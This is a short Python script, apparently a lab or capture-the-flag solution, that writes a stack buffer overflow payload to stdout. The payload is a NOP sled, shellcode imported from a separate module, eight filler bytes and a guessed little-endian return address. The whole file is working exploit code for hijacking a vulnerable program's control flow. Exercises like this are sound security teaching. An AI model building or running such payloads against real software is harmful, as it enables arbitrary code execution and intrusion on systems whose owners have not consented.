#!/usr/bin/env python3

import sys
from shellcode import shellcode
nop_size = 1024 - len(shellcode)

approx_address = 0x7ffffff0a090
approx_to_bytes = approx_address.to_bytes(8, 'little')

combined = b"\x90"*nop_size + shellcode + b"A"*8 + approx_to_bytes
sys.stdout.buffer.write(combined)